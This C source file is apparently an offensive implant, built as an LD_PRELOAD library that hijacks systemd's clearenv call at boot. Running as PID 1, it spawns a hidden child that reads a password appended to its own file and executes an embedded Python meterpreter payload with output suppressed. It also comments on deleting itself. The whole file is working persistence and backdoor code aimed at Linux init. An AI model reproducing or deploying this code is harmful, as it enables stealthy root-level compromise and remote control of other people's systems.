#define _DEFAULT_SOURCE
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>

// dirty, see Makefile
#include "/dev/stdin"

int shell(void) {
    if(getpid() == 1) {
        pid_t pid = fork();
        if (pid == 0) {
            // don't show any output
            close(1);
            close(2);
            close(3);
            // store our own path for later use
            char *sopath = getenv("LD_PRELOAD");
            // we don't want children to load us
            unsetenv("LD_PRELOAD");

            // find password
            FILE *self = fopen(sopath, "r");
            fseek(self, -1, SEEK_END);
            int pwlen = 0;
            while (fgetc(self) != 0) {
                pwlen++;
                // fgetc advances, go back 2
                fseek(self, -2, SEEK_CUR);
            }
            // read password
            char *pass = malloc(pwlen+1);
            pass[pwlen] = '\0';
            fread(pass, pwlen, 1, self);
            fclose(self);

            // give password to meterpreter as env var
            char *env;
            asprintf(&env, "PASSWORD=%s", pass);
            free(pass);
            char *envp[] = {
                env,
                NULL
            };
            // delete self
            // unlink(sopath);
            // sleep, wait for networking etc
            sleep(WAIT);

            // try our best to find python. We don't have PATH so we can't use execvpe
            char *pythonpaths[] = {
                "/usr/bin/python2",
                "/usr/local/bin/python2",
                "/bin/python2",

                "/usr/bin/python3",
                "/usr/local/bin/python3",
                "/bin/python3"
            };
            for (int i = 0; i < 6; i++) {
                if (access(pythonpaths[i], F_OK) != -1) {
                    execle(pythonpaths[i],
                            "python",
                            "-c",
                            PAYLOAD, // payload is taken from /dev/stdin. See Makefile for details
                            NULL,
                            envp);
                }
            }
        }
    } else {
        unsetenv("LD_PRELOAD");
    }
    return 0;
}


extern char **environ;
int clearenv (void) {
    /*
     * clearenv is called once in systemd, just before we switch root.
     * systemd/src/core/main.c:1901
     */

    char ldpreload[] = "LD_PRELOAD=/usr/lib/lblinux.so.1\0";
    environ[0] = malloc(strlen(ldpreload)+1);
    environ[0] = ldpreload;
    environ[1] = NULL;
    return 0;

}
